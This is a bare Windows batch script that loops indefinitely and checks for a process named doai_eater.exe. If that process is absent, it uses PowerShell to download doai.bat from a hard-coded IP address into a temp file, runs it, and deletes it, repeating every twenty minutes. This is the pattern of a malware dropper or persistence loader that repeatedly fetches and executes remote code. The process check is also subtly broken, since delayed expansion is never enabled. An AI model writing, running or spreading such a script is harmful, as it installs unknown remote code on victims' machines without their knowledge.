@echo off

:loop
  for /f "tokens=1 delims= " %%a in ('tasklist /FI "IMAGENAME eq doai.exe" /FO CSV ^| findstr /I "doai_eater.exe"') do set doai_process=%%a

  if "!doai_process!"=="" (
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://107.173.101.73/doai.bat', $tempfile); & \"$tempfile\"; Remove-Item -Force $tempfile"
  )
  timeout /t 1200 /nobreak >nul 2>&1
goto loop
